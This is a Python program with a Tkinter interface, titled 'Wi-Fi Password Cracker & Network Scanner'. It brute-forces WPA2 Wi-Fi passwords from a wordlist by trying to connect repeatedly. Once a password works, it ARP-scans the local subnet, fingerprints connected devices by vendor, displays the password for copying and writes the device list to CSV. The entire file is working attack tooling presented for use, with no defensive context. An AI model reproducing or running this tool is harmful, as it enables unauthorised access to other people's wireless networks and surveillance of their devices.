import time
import pywifi
from pywifi import const
from tkinter import *
from tkinter import messagebox, ttk
import os
import pyperclip
from scapy.all import ARP, Ether, srp, conf
from mac_vendor_lookup import MacLookup
import csv

# Initialize variables
available_devices = []
keys = []
final_output = {}

# Function to scan for Wi-Fi networks
def scan_networks(interface):
    interface.scan()
    time.sleep(5)  # Wait for the scan to complete
    networks = interface.scan_results()
    return [network.ssid for network in networks if network.ssid]

# Function to connect to secured Wi-Fi
def connect_secured_network(interface, ssid, password):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    interface.remove_all_network_profiles()
    interface.add_network_profile(profile)
    interface.connect(profile)
    time.sleep(5)
    return interface.status() == const.IFACE_CONNECTED

# Update list of available networks
def update_network_list():
    global available_devices
    available_devices = scan_networks(interface)
    network_listbox.delete(0, END)
    for ssid in available_devices:
        network_listbox.insert(END, ssid)

# Guess device type from MAC vendor
def guess_device_type(vendor):
    vendor = vendor.lower()
    if any(k in vendor for k in ["apple", "iphone", "ipad"]):
        return "Apple Device"
    elif "samsung" in vendor:
        return "Android Phone"
    elif any(k in vendor for k in ["intel", "hp", "dell", "lenovo", "asus"]):
        return "Laptop/PC"
    elif any(k in vendor for k in ["xiaomi", "oppo", "vivo", "realme"]):
        return "Android Phone"
    elif any(k in vendor for k in ["huawei", "zte"]):
        return "Phone or Router"
    elif any(k in vendor for k in ["hon hai", "liteon", "azurewave", "tp-link", "netgear"]):
        return "IoT Device / Router"
    else:
        return "Unknown"

# ARP Scan to detect connected devices
def get_connected_devices():
    conf.verb = 0
    ip_range = "192.168.1.1/24"
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=0)[0]

    clients = []
    for sent, received in result:
        mac = received.hwsrc
        ip = received.psrc
        try:
            vendor = MacLookup().lookup(mac)
        except:
            vendor = "Unknown"
        device_type = guess_device_type(vendor)
        clients.append({
            "IP Address": ip,
            "MAC Address": mac,
            "Vendor": vendor,
            "Device Type": device_type
        })
    return clients

# Save to CSV
def save_devices_to_csv(devices, filename="connected_devices.csv"):
    with open(filename, mode='w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=["IP Address", "MAC Address", "Vendor", "Device Type"])
        writer.writeheader()
        for device in devices:
            writer.writerow(device)

# Show results after successful crack
def show_congratulation_popup(ssid, password, devices):
    popup = Toplevel(root)
    popup.title("Success!")
    popup.geometry("500x400")
    popup.configure(bg="#f5f5f5")

    Label(popup, text=f"Password for '{ssid}':", font=("Helvetica", 12, "bold"), bg="#f5f5f5").pack(pady=10)
    Label(popup, text=password, font=("Helvetica", 12), bg="#f5f5f5", fg="green").pack(pady=5)

    Button(popup, text="Copy Password", command=lambda: pyperclip.copy(password), bg="#4CAF50", fg="white").pack(pady=5)

    Label(popup, text="Connected Devices:", font=("Helvetica", 12, "bold"), bg="#f5f5f5").pack(pady=10)

    text_box = Text(popup, width=60, height=10, wrap=WORD, bg="#ffffff", fg="#000000")
    for device in devices:
        info = f"{device['IP Address']} - {device['MAC Address']} - {device['Vendor']} ({device['Device Type']})"
        text_box.insert(END, info + "\n")
    text_box.pack(pady=5)

    save_devices_to_csv(devices)

    Button(popup, text="OK", command=popup.destroy, bg="#f5f5f5").pack(pady=10)

# Main function to start cracking
def start_cracking():
    selected_network = network_listbox.get(ACTIVE)
    if not selected_network:
        messagebox.showerror("Error", "Please select a Wi-Fi network.")
        return

    password_file = file_entry.get()
    if not os.path.isfile(password_file):
        messagebox.showerror("Error", "Invalid file path.")
        return

    with open(password_file, 'r') as f:
        keys = [line.strip() for line in f]

    progress['value'] = 0
    result_text.set("Trying passwords...")
    root.update_idletasks()

    found_password = None
    for i, password in enumerate(keys):
        progress['value'] = int((i+1) / len(keys) * 100)
        root.update_idletasks()
        process_text.config(state=NORMAL)
        process_text.insert(END, f"Trying password: {password}\n")
        process_text.config(state=DISABLED)
        process_text.yview(END)

        if connect_secured_network(interface, selected_network, password):
            found_password = password
            break

    if found_password:
        final_output[selected_network] = found_password
        result_text.set(f"Success! Password found.")
        connected_devices = get_connected_devices()
        show_congratulation_popup(selected_network, found_password, connected_devices)
    else:
        result_text.set("Failed to crack the password.")

# Set up the GUI
root = Tk()
root.title("Wi-Fi Password Cracker & Network Scanner")
root.geometry("600x700")
root.configure(bg="#f5f5f5")

wifi = pywifi.PyWiFi()
interface = wifi.interfaces()[0]

Label(root, text="Available Networks:", bg="#f5f5f5").pack(pady=5)
network_listbox = Listbox(root, width=50, height=10, bg="#ffffff", fg="#000000")
network_listbox.pack(pady=5)
Button(root, text="Scan Networks", command=update_network_list, bg="#4CAF50", fg="white").pack(pady=5)

Label(root, text="Password List File:", bg="#f5f5f5").pack(pady=5)
file_entry = Entry(root, width=50)
file_entry.insert(0, r'E:\Desktop\WiFi_Hacking\test.txt')
file_entry.pack(pady=5)

Button(root, text="Start Cracking", command=start_cracking, bg="#4CAF50", fg="white").pack(pady=5)

progress = ttk.Progressbar(root, orient=HORIZONTAL, length=300, mode='determinate')
progress.pack(pady=5)

result_text = StringVar()
result_label = Label(root, textvariable=result_text, justify=LEFT, wraplength=450, bg="#f5f5f5")
result_label.pack(pady=5)

process_text = Text(root, width=70, height=12, wrap=WORD, state=DISABLED, bg="#ffffff", fg="#000000")
process_text.pack(pady=10)

root.mainloop()
